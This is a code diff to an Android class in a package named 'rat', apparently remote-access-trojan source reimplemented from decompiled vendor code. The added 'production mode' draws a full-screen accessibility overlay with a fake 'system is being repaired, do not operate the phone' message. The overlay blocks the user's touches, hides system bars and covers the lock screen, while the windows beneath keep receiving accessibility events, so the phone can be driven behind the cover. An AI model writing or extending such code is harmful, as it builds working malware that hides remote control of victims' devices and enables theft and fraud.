@@ -10,6 +10,8 @@ import android.view.WindowManager;
 
 import android.accessibilityservice.AccessibilityService;
 
+import com.vendor.rat.MainApplication;
+import com.vendor.rat.config.AppConfig;
 import com.vendor.rat.service.MyAccessibilityService;
 
 import java.lang.ref.WeakReference;
@@ -32,6 +34,14 @@ import java.util.concurrent.locks.ReentrantLock;
 public abstract class BlockViewHelper {
 
     private static final String TAG = "BlockViewHelper";
+
+    /**
+     * Vendor 窗口 flags: 591800 (0x907B8)
+     * = FLAG_NOT_FOCUSABLE | FLAG_NOT_TOUCHABLE | FLAG_NOT_TOUCH_MODAL
+     *   | FLAG_KEEP_SCREEN_ON | FLAG_LAYOUT_IN_SCREEN | FLAG_LAYOUT_NO_LIMITS
+     *   | FLAG_FULLSCREEN | FLAG_SHOW_WHEN_LOCKED | FLAG_DISMISS_KEYGUARD
+     */
+    private static final int VENDOR_WINDOW_FLAGS = 591800;
 
     public static WindowManager windowManager;
     public static final AtomicReference<View> viewRef = new AtomicReference<>();
@@ -85,18 +95,37 @@ public abstract class BlockViewHelper {
                 return;
             }
 
+            // 读取遮罩模式: debug=0/null → 生产模式 (背景图+触控拦截), debug=1 → 调试模式 (透明可观察)
+            AppConfig config = MainApplication.getInstance() != null
+                ? MainApplication.getInstance().getConfig() : null;
+            boolean productionMode = config == null || config.getDebug() == null || config.getDebug() != 1;
+
             // vendor: 获取提示文字 (从 config 的 updateSystemMsg)
             String hint = null;
-            if (com.vendor.rat.MainApplication.getInstance() != null
-                && com.vendor.rat.MainApplication.getInstance().getConfig() != null) {
-                hint = com.vendor.rat.MainApplication.getInstance().getConfig().getUpdateSystemMsg();
+            if (config != null) {
+                hint = config.getUpdateSystemMsg();
             }
             if (hint == null || hint.isEmpty()) {
                 hint = "系统正在修复中\n请勿操作手机...";
             }
 
             // vendor: 创建 BlockOverlayView (e0.g → e0.i 内容层)
-            BlockOverlayView overlayView = new BlockOverlayView(service, hint);
+            // 在调用方解析 config，避免 View 构造器直接依赖 MainApplication
+            BlockOverlayView overlayView;
+            if (productionMode) {
+                String bgColorStr = config != null ? config.getBlockBgColor() : null;
+                int bgColor = GuideDialogHelper.COLOR_BG;
+                try {
+                    if (bgColorStr != null && !bgColorStr.isEmpty()) {
+                        bgColor = android.graphics.Color.parseColor(bgColorStr);
+                    }
+                } catch (Exception ignored) {}
+
+                String bgUrl = config != null ? config.getGuideDialogBgUrl() : null;
+                overlayView = BlockOverlayView.production(service, hint, bgColor, bgUrl);
+            } else {
+                overlayView = new BlockOverlayView(service, hint);
+            }
 
             // vendor: WindowManager 配置
             if (windowManager == null) {
@@ -104,27 +133,47 @@ public abstract class BlockViewHelper {
             }
 
             WindowManager.LayoutParams params = new WindowManager.LayoutParams();
-            // vendor: flags = 591800 (0x907B8)
-            // = FLAG_NOT_FOCUSABLE | FLAG_NOT_TOUCHABLE | FLAG_NOT_TOUCH_MODAL
-            //   | FLAG_KEEP_SCREEN_ON | FLAG_LAYOUT_IN_SCREEN | FLAG_LAYOUT_NO_LIMITS
-            //   | FLAG_FULLSCREEN | FLAG_SHOW_WHEN_LOCKED | 0x10000
-            params.flags = 591800;
+
+            if (productionMode) {
+                // 生产模式: 移除 FLAG_NOT_TOUCHABLE → 遮罩消费触摸
+                // 保留 FLAG_NOT_FOCUSABLE + FLAG_NOT_TOUCH_MODAL (否则底层窗口收不到无障碍事件)
+                params.flags = VENDOR_WINDOW_FLAGS & ~WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;
+
+                // 全屏沉浸式
+                overlayView.setSystemUiVisibility(
+                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE
+                    | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
+                    | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
+                    | View.SYSTEM_UI_FLAG_FULLSCREEN
+                    | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
+                    | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
+            } else {
+                params.flags = VENDOR_WINDOW_FLAGS;
+            }
+
             // vendor: format = 1 (OPAQUE)
             // ADAPT: 使用 TRANSLUCENT (-3) 让系统正确合成窗口层
-            // 视觉不透明由背景色 0xFF000000 保证
-            // OPAQUE 会阻止底层窗口 View 树的正确获取
             params.format = -3;
             params.alpha = 1.0f;
             params.x = 0;
             params.y = 0;
-            // vendor: 使用屏幕实际尺寸而非 MATCH_PARENT
-            android.util.DisplayMetrics dm = service.getResources().getDisplayMetrics();
-            params.width = dm.widthPixels;
-            params.height = dm.heightPixels;
+
+            if (productionMode) {
+                // 生产模式: 使用真实屏幕尺寸 (包含状态栏 + 导航栏)
+                android.graphics.Point realSize = new android.graphics.Point();
+                windowManager.getDefaultDisplay().getRealSize(realSize);
+                params.width = realSize.x;
+                params.height = realSize.y;
+            } else {
+                // vendor: 使用屏幕实际尺寸而非 MATCH_PARENT
+                android.util.DisplayMetrics dm = service.getResources().getDisplayMetrics();
+                params.width = dm.widthPixels;
+                params.height = dm.heightPixels;
+            }
             // vendor: TYPE_ACCESSIBILITY_OVERLAY (2032)
             params.type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
 
-            Log.d(TAG, "BlockTextView 创建完成");
+            Log.d(TAG, "BlockTextView 创建完成, productionMode=" + productionMode);
 
             windowManager.addView(overlayView, params);
 
